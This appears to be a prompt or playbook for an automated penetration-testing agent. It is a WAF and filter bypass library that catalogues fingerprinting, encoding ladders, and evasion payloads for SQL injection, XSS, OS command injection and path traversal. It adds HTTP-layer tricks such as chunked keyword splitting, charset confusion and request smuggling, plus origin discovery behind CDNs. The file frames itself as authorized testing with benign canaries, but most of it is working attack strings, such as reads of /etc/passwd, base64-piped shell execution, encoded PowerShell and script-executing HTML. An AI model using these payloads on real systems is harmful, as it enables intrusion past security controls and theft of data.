# WAF / filter bypass technique library
# Authorized, in-scope app only. Probe with BENIGN canaries. Never attack the WAF vendor/another tenant. Not a DoS.

## 1. Fingerprint the WAF/CDN
```
wafw00f https://TARGET        identYwaf
```
- Headers: `Server`, `X-CDN: Incapsula`, `X-Sucuri-ID`, `fastly-debug-*`, `cf-ray` (Cloudflare), `x-amzn-*`.
- Cookies: `__cf_bm`/`cf_clearance`/`cf_chl_*` (Cloudflare), `AWSALB`/`AWSALBCORS`/`AWSELB` (AWS ALB),
  `incap_ses`/`visid_incap` (Imperva), `ak_bmsc` (Akamai).
- Challenge pages / JS objects (`_cf_chl_opt`), route probes (`/cdn-cgi/`), block-page signatures.
- Transport: JA3/JA4 TLS fingerprint, HTTP/2–3 negotiation differences.

## 2. Confirm the block (baseline)
A benign request returns 200; the agent's payload returns 403/406/429 or a challenge. Find the MINIMAL
transform that flips the payload back to a normal response with a benign canary — don't burn exploit strength.

## 3. Payload-level evasion (by the blocked vuln-class)
- **SQLi:** case (`SeLeCt`), inline comments (`UN/**/ION`), whitespace swaps (`%09 %0a %0c %a0 ++`), hex
  (`0x61`), `CHAR()`/`CONCAT`/`||`, numeric rewrites (`1-0`, `1+0`), double-URL-encode, JSON-operator injection.
- **XSS:** context-specific, mutation XSS (parser quirks, `noscript`), alt tags/events (`svg`, `details/ontoggle`),
  `atob`+`eval`, bracket property access, `\u` escapes, entity-encoded `javascript:`, `data:` URIs, CSS vectors,
  polyglots, CSP gadgets (JSONP, DOM clobbering, allowed-origin).
- **Command/SSTI/path:** encoding + separators + wrappers (hand confirmation to that agent).

## 4. HTTP manipulation
- Method case / whitespace (`get`, leading tab before method).
- Spoof-origin headers: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Real-IP`, `X-Client-IP`, `Client-IP`,
  `Forwarded`, `X-Originating-IP`.
- Duplicate headers / conflicting `Content-Encoding`; HTTP parameter pollution (`?id=a&id=b`) — see
  `parameter-pollution`; CRLF/line-folding; oversized body; multipart boundary + mixed `Content-Type`
  (put the payload in a low-weight field like multipart `filename`).

## 5. Transport / origin
- **TLS/JA3 alignment**: present a browser-like JA3 (uTLS/tls-client/curl-impersonate) so the fingerprint
  doesn't flag automation.
- **HTTP/2 / HTTP/3**: `curl --http2` / `--http3`; `:authority` vs SNI mismatch; test whether the WAF
  inspects HTTP/2 the same as HTTP/1.
- **Origin discovery** (bypass the CDN entirely): Shodan/Censys, `CloudFlair`, historical DNS
  (SecurityTrails), `Alt-Svc` leakage, then a direct request to the origin IP with a spoofed `Host`.
  **Scope-check any origin IP before using it.**
- **SNI**: `openssl s_client -servername`, `curl --connect-to`, domain fronting (CDN-dependent).

## 6. GraphQL / ML-WAF
- GraphQL: deep alias nesting, batched ops, renamed fields, upload-scalar variants (`graphql-cop`, `InQL`).
- ML/semantic WAFs: semantic rewrites, noise-token padding, Unicode homoglyphs, mixed SQLi/XSS syntax,
  payload in low-weight fields; iterate from the WAF's own feedback.

## Do NOT (DoS — catalogued for awareness only)
Rapid Reset (CVE-2023-44487), CONTINUATION flood, connection-pool exhaustion, IP-fragmentation floods —
**never fire these**; note them for the report if relevant.

## Hand-back
Write `waf_profile.json` = `{waf, evidence, transforms_tried:[{transform, canary, passed}], origin_ip?}`
and `bypass_notes.md` = the specific transform(s) the calling vuln agent should wrap its payloads in.

---
## Extended arsenal — encoding ladders (climb one rung at a time)

# A WAF decodes input N times, then matches its rules. Deliver the payload so it is STILL obscured when the
# rule engine inspects it, but fully decoded by the time the app parser consumes it. Climb one rung at a
# time; stop at the LOWEST rung that passes a benign canary. Don't jump straight to rung 10.
# Columns show the character `<` (U+003C) under each transform; apply the same method per-byte to keywords.

| Rung | Transform | `<` becomes | Notes / where it lands |
|---|---|---|---|
| 0 | plain | `<` | baseline |
| 1 | mixed / inverted case | n/a (keyword) | `SeLeCt`, `ScRiPt` — defeats case-sensitive signatures |
| 2 | URL-encode | `%3c` | app url-decodes once; WAF may not |
| 3 | double-URL | `%253c` | front decodes once -> `%3c`, backend decodes again -> `<` |
| 4 | partial / per-byte | `%73elect` | encode only the signature-bearing byte(s) |
| 5 | HTML decimal/hex entity | `&#60;` `&#x3c;` | sinks that HTML-decode (attributes, titles) |
| 6 | entity, no semicolon | `&#60` `&lt` | lax HTML parsers still decode |
| 7 | unicode escape | `<` | JS / JSON string sinks decode this |
| 8 | overlong UTF-8 | `%c0%bc` `%e0%80%bc` | decoders that accept non-shortest form |
| 9 | legacy `%uXXXX` | `%u003c` | servers/decoders that normalize `%u` form |
| 10 | UTF-7 (charset-gated) | `+ADw-` | only if the response charset is sniffed as UTF-7 |

# Ladder combinators (stack transforms): double-encode THEN case-toggle; entity-encode INSIDE a
# url-encoded value; wrap one keyword byte in overlong UTF-8 while leaving the rest plain. Each extra layer
# costs app-parser tolerance — verify the app still interprets the decoded form with a benign canary.

---
## Extended arsenal — comment & whitespace injection by context

# "Whitespace" and "a word boundary" are what most signatures key on. Replace them with characters the
# TARGET parser treats as equivalent but the rule regex does not.

### SQL — whitespace & comment equivalents
```
space  ->  /**/   %09(tab)  %0a(LF)  %0b(VT)  %0c(FF)  %0d(CR)  %a0(nbsp)  ()  +
UN/**/ION   SE/**/LECT   OR/**/1=1
/*!50000SELECT*/   /*!UNION*/              # MySQL versioned comment: runs, often slips rule engines
--  #  ;%00  -- -  /* ... */               # terminators; `-- ` needs the trailing space (use `-- -`)
(SELECT(1)FROM(DUAL))                      # parentheses remove EVERY space
```

### XSS / HTML — separators & comment tricks
```
<svg/onload=...>     <svg%0conload=...>     <svg%09onload=...>     # tag/attr separators
<img/src=x/onerror=...>                                            # slash as attr separator
<a href="jav&#x09;ascript:...">                                    # in-token whitespace entity
<!-- --><svg ...>     <svg><!--c-->onload...>                       # comment interleave
<scr<script>ipt>     <scri%00pt>                                    # split-keyword / null (legacy parsers)
```

### OS command — argument & token separators
```
cat${IFS}/etc/passwd    cat$IFS$9/etc/passwd    {cat,/etc/passwd}    cat</etc/passwd   # no literal space
c""at /etc/passwd   c'a't /etc/passwd   \cat /etc/passwd   ca\t /etc/passwd   # intra-word break (shell strips)
who$@ami   w\ho\am\i   w'h'o'am'i   "wh"o"am"i                      # assemble the binary name
id%0aid    id%0did    `id`   $(id)   id||id   id&&id                # command separators
```

### Path / LFI — separator & dot-segment tricks
```
..%2f   ..%5c   %2e%2e%2f   ..%252f   ....//   ..././   ..;/   %2e/      # traversal encodings
/etc/passwd%00   /etc/passwd#   /etc/passwd?   /./etc/./passwd           # truncation / no-op segments
%c0%ae%c0%ae%c0%af                                                       # overlong-UTF-8 `../`
```

---
## Extended arsenal — per-class filter → evasion matrix (headline map)

# "I get a 403 on class X when I send token Y" -> pick the evasion. Deliver the SAME benign canary; the goal
# is to get the already-benign proof past the filter, not to strengthen the payload.

| Class | Blocked token / signature | Benign evasion to try (low rung first) |
|---|---|---|
| SQLi | `UNION SELECT` | `UNION/**/SELECT`, `uNiOn SeLeCt`, `/*!UNION*/SELECT`, `%55NION`, nested `UNIunionON` |
| SQLi | spaces | `/**/`, `%09`/`%0a`/`%0c`/`%a0`, `()`, `+` |
| SQLi | quotes `' "` | `0x..` hex, `CHAR()`, `CONCAT()`, numeric context (no quote) |
| SQLi | `OR`/`AND` | `||` / `&&`, `%7c%7c`, equality via `BETWEEN`/`IN`/`LIKE`, `XOR` |
| SQLi | `--`/`#` comment | `;%00`, close with `'||'`, `/* */`, balanced parens |
| XSS | `<script>` | `<svg onload>`, `<img onerror>`, `<details ontoggle>`, `<svg><set onbegin>` |
| XSS | `on*` handlers | `javascript:` URI, `<iframe srcdoc>`, CSS/`style` vectors, `<svg><animate onbegin>` |
| XSS | `alert`/`(` | `` alert`1` ``, `top['al'+'ert'](1)`, `Function('...')()`, `onerror=alert;throw 1` |
| XSS | `javascript:` | `java&#09;script:`, `javascript&colon;`, `JaVaScRiPt:`, entity/URL-encode the scheme |
| XSS | `"`/`'` quotes | unquoted attr + whitespace/backtick, entity `&quot;`, context-break with `` ` `` |
| LFI | `../` | `..%2f`, `....//`, `..%252f`, `%c0%ae%c0%ae%c0%af`, `..;/` |
| LFI | `/etc/passwd` | wrapper `php://filter/convert.base64-encode/resource=`, abs-path split `/etc/./passwd` |
| LFI | null/ext append | `%00` (legacy), `?`/`#` truncation, path-length padding `/././…/` |
| RCE | `;`/`|`/`&` | `%0a` newline, `$(...)`, `` `...` ``, `||`/`&&`, nested `$( )` |
| RCE | spaces | `${IFS}`, `$IFS$9`, `{cmd,arg}`, `<redir` |
| RCE | binary name | `c""at`, `c\at`, `/bin/c?t`, `/???/??t`, `$(rev<<<imaohw)`, `base64 -d|sh` |
| RCE | `/` path sep | `${PATH:0:1}`, `${HOME:0:1}`, `$(printf '\57')` |
| SSTI | `{{ }}` | `${ }`, `{% %}`, `#{ }`, engine-specific delims; split braces across concatenation |

---
## Extended arsenal — SQLi WAF evasion (deep, by constraint)

### No whitespace allowed
```
'OR(1)=(1)-- -                          # parentheses replace spaces
'OR/**/1=1-- -                          # inline comment replaces spaces
'%0aOR%0a1=1-- -                        # newline whitespace
'UNION(SELECT(@@version))-- -
```
### No commas (filter on `,`, or to dodge UNION column-count fingerprints)
```
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b              # build a row without commas
SUBSTRING(version() FROM 1 FOR 1)                            # ANSI SUBSTRING, no comma
... LIMIT 1 OFFSET 1                                         # instead of LIMIT 1,1
```
### No quotes allowed
```
0x61646d696e                            # hex literal for a string
CHAR(97,100,109,105,110)                # build a string from codepoints (MySQL)
CONCAT(0x61,0x62)                       # hex + concat
```
### Keyword filtered (strip-once or signature)
```
UNIunionON   SELECTselectT              # nested: a single-pass strip rebuilds the keyword
/*!50000UNION*/  /*!SELECT*/            # MySQL versioned comment executes the content
UN%49ON                                 # url-encode one byte (%49='I')
```
### Numeric / operator rewrites (dodge `=`, `1=1`, digits)
```
1 LIKE 1    1 BETWEEN 1 AND 1    1 IN (1)    1 REGEXP 1      # equality without `=`
1e0   .1   0b1   0x1                     # numeric-literal variety
true   !false   1 XOR 0                  # boolean without digits
```
### Logical operators
```
' || '1'='1        ' && '1'='1        '%26%26'1'='1
```
Hand the confirmed injection to `sqli-inband` / `sqli-blind`; this library only gets the BENIGN probe past the filter.

---
## Extended arsenal — XSS WAF evasion (deep, by constraint)

### `<script>` / common tags blocked — alternative execution tags
```
<svg onload=alert(1)>              <img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>   <video><source onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>     <marquee onstart=alert(1)>
<body onpageshow=alert(1)>         <input autofocus onfocus=alert(1)>
```
### Handlers (`on*`) blocked — scheme / nested-content vectors
```
<a href="javascript:alert(1)">x</a>        <iframe srcdoc="&lt;svg onload=alert(1)&gt;">
<form><button formaction="javascript:alert(1)">x        <math><mtext><a href="javascript:alert(1)">
```
### `javascript:` scheme filtered
```
java&#09;script:alert(1)     java&#10;script:alert(1)     javascript&colon;alert(1)
JaVaScRiPt:alert(1)          %6aavascript:alert(1)        &#x6a;avascript:alert(1)
```
### `alert`/`(`/`)` or keyword blocked — compute the sink
```
alert`1`                                # backtick call, no parens
top['al'+'ert'](1)     self[atob('YWxlcnQ=')](1)
onerror=alert;throw 1                    # handler ref + throw triggers it with no ()
Function('ale'+'rt(1)')()                [].constructor.constructor('alert(1)')()
top[8680439..toString(30)](1)            # 'alert' from a base-30 number
```
### Quotes / angle brackets stripped (attribute or JS-string context)
```
" autofocus onfocus=alert(1) x="         # break out of a double-quoted attribute
'-alert(1)-'     ';alert(1)//             # break out of a JS string literal
accesskey=X onclick=alert(1)             # unquoted attribute injection
```
### Mutation / parser-confusion (mXSS) — inert until the DOM re-parses it
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<template><s><tt><img src=x onerror=alert(1)></template>
<svg><style><img src=x onerror=alert(1)></style></svg>
```
Under CSP, swap inline handlers for an allowed-source gadget (JSONP / DOM clobbering / allowed origin) or report
"reflected, non-executing under CSP". Hand the executing PoC to the matching `xss-*` agent.

---
## Extended arsenal — command-injection & path WAF evasion (deep)

### *nix shell — spacing, quoting, globbing, encoding
```
cat${IFS}/etc/passwd    cat$IFS$9/etc/passwd    {cat,/etc/passwd}    cat</etc/passwd
c""at /etc/passwd   c'a't /etc/passwd   \cat /etc/passwd   ca\t /etc/passwd    # intra-word breaks
/bin/c?t /etc/passwd   /???/??t /et?/p??s??   /bin/cat /e*c/pa??wd              # globbing
$(rev<<<imaohw)   echo -n d2hvYW1p|base64 -d|sh   $(printf '\167\150\157\141\155\151')
${PATH:0:1}etc${PATH:0:1}passwd                                                # build '/' from $PATH
X=cat;$X /etc/passwd    a=c;b=at;$a$b /etc/passwd                              # variable assembly
```
### Windows — caret, quotes, substrings, PowerShell
```
who^ami    w"h"oami    c^m^d /c whoami
%PROGRAMFILES:~0,1%                                     # substring expansion -> 'C' etc.
powershell -e <base64-UTF16LE>     powershell -enc ... # encoded command
p^o^w^e^r^s^h^e^l^l     iex(...)                        # caret-split, PS invocation
```
### Separators / chaining (choose one the WAF doesn't tokenize)
```
;   |   ||   &   &&   %0a(newline)   %0d   `cmd`   $(cmd)   <(cmd)   >(cmd)
```
### Path traversal / LFI (encoding ladder + parser quirks)
```
../  ..\  ..%2f  ..%5c  %2e%2e%2f  %2e%2e/  ..%252f (double)  ....// (strip-once reconstruct)
..%c0%af   %c0%ae%c0%ae%c0%af (overlong UTF-8)   ..;/ (servlet path-param)   ..%00/ (legacy null)
/var/www/../../etc/passwd   /proc/self/root/etc/passwd   php://filter/convert.base64-encode/resource=
```
Confirmation stays benign (`id`/`whoami`, read a non-sensitive marker file, or an OOB ping to `TOKEN.oob.example`);
hand impact proof to `command-injection` / `path-traversal-lfi`.

---
## Extended arsenal — HTTP-layer evasion (deep)

### Verb / method tampering
```
GET -> POST -> PUT -> PATCH            # move the param into a body the WAF rules don't cover
X-HTTP-Method-Override: PUT            # override headers (also X-Method-Override, X-HTTP-Method)
HEAD / arbitrary verb FOOBAR          # frameworks that route an unknown verb to the GET handler
lowercase verb `get` / leading tab    # lax HTTP/1.1 parsers; a WAF may require canonical casing
```
### Content-Type confusion (same bytes, different parser weight)
```
Content-Type: application/json         {"q":"<payload>"}            # send a form-expected param as JSON
Content-Type: application/x-www-form-urlencoded                     # ...or the reverse
Content-Type: text/plain               q=<payload>                  # some body-parsers still read it
Content-Type: application/xml / text/xml                            # an XML body a JSON-focused WAF ignores
Content-Type: multipart/form-data; boundary=X                      # see multipart tricks below
(missing / bogus Content-Type)                                      # app guesses; WAF may skip body rules
```
### Charset / transfer tricks
```
Content-Type: application/x-www-form-urlencoded; charset=utf-16     # WAF reads the wrong charset, app decodes
; charset=ibm037 (EBCDIC)    ; charset=utf-7                        # payload invisible to ASCII rules
Content-Encoding: gzip|deflate|br      # compress the body; a WAF that doesn't inflate sees noise
Transfer-Encoding: chunked             # split a keyword ACROSS chunk boundaries (`UNI` | `ON SELECT`)
```
### Multipart boundary abuse
```
--X
Content-Disposition: form-data; name="q"; filename="a.txt"         # payload in a low-weight field
Content-Type: text/plain; charset=utf-7
<payload>
--X--
# tricks: duplicate / conflicting boundaries, boundary with special chars, name vs filename, per-part
#   Content-Type/charset, trailing data after the closing boundary, LF-only (no CR) line endings.
```
### JSON parser tricks
```
{"q":"<payload>"}            # unicode-escape the signature bytes
{"q":"a","q":"<payload>"}              # duplicate key -> last-wins parser sees payload, WAF saw first
{"q":["<payload>"]}   {"q":{"$":"<payload>"}}   # type juggling / nesting the app flattens
{"q":"<payload>"}/*trailing*/          # trailing bytes / comments (lenient JSON5-ish parsers)
```
### Header casing / folding / duplication
```
content-length / Content-Length / CONTENT-LENGTH     # casing a strict WAF mis-keys
header folding (obs-fold): "X-Foo:\r\n <value>"      # legacy continuation
duplicate headers (CL, Host, Content-Type) where WAF reads one, origin another  -> request-smuggling
conflicting Content-Encoding / Transfer-Encoding                                 -> request-smuggling
```
### Null bytes & padding
```
param%00=value        value%00<payload>        # null truncates a WAF string match, not the app parser
# oversized junk prefix: pad the body with benign filler BEFORE the payload so it falls past the WAF's
#   body-inspection byte limit (next section). Keep total size sane — never a DoS.
```

---
## Extended arsenal — body-inspection limits & request fragmentation

# Most WAFs inspect only the first N KB of a body (cost control). Place benign filler first, payload after
# the cutoff. FIND the limit with a benign binary search; stay well below any size that stresses the host.
```
# 1) send increasing filler + a benign canary AFTER it; note the size at which the canary stops being blocked
pad = "x" * N ; body = "legit=" + pad + "&q=<benign-canary>"
# 2) common cutoffs to probe (KB): 8, 16, 32, 64, 128  (vendor-dependent)
```
# Fragmentation across the transport (split the keyword so no single buffer holds the signature):
```
Transfer-Encoding: chunked            # put `UNI` in chunk 1, `ON SELECT` in chunk 2 (re-joined by origin)
HTTP/2 DATA frames split mid-keyword  # a WAF that reassembles differently than the origin
pipelined / multi-packet splits       # TCP segment boundaries inside the signature
```
# A WAF that normalizes/buffers the full request before matching defeats these — record what worked.

---
## Extended arsenal — WAF behavior families (describe behavior, pick the lever)

# Group by BEHAVIOR, not brand. Fingerprint (section 1) tells you the family; the family tells you which
# levers above are likely to work. These are behavioral generalizations to TEST, not guarantees.

| Family (behavior) | Typical block tell | Levers that tend to work |
|---|---|---|
| Edge/CDN rule-engine | block page + ray-id cookie, challenge JS | origin discovery, double-encoding, body-size limit, charset |
| Cloud managed rule-set | 403/406 + rule-id in body, paranoia tiers | per-byte encoding, comment-insertion, versioned comments, verb/CT swap |
| Reverse-proxy module (embedded ruleset) | 403 + distinctive server banner | chunked keyword-split, obs-fold, TE/CL quirks, tuning gaps |
| Appliance / inline IPS | RST / silent drop / 406 | fragmentation, slow delivery, TLS/JA3 realism, protocol downgrade |
| ML / semantic scorer | soft-block at a score threshold, 429 | noise-token padding, homoglyphs, low-weight field placement, syntax-mixing |
| Rate / bot layer | 429 + managed challenge | JA3/JA4 realism, HTTP/2 priority realism, pacing, session-cookie reuse |

# Paranoia / sensitivity: rule-set engines often expose levels — higher levels block more BENIGN traffic, so
# a bypass at a high level may be a tuning artifact; note the level in the report.

---
## Extended arsenal — tooling, automation & confirmation discipline

### Benign automation (iterate transforms, not force)
```
wafw00f / identYwaf             # fingerprint (section 1)
ffuf -w transforms.txt -u 'https://HOST/?q=FUZZ' -mc all   # measure which encoded canary passes
nuclei -tags waf                # curated benign checks
curl-impersonate / tls-client   # browser-realistic JA3 so the request isn't flagged as automation
# custom mutator: generate the encoding ladder for ONE benign canary, fire, record pass/block.
```
### Record every attempt
```
transforms_tried.jsonl: {class, rung, transform, canary, status, blocked, delivered}
```
### Confirmation discipline (do not inflate)
- The proof is: the BENIGN canary was BLOCKED plain and DELIVERED after the transform (same canary, same sink).
- A transform that merely returns 200 with the payload *encoded/inert* is NOT a bypass — confirm the sink
  still interprets it (apply the vuln agent's verify criteria).
- Prefer the lowest rung; a single `/**/` that works beats a fragile 5-layer stack.
- Stay in scope, benign, rate-limited. Never target the WAF tenant/control-plane or fire any DoS vector.
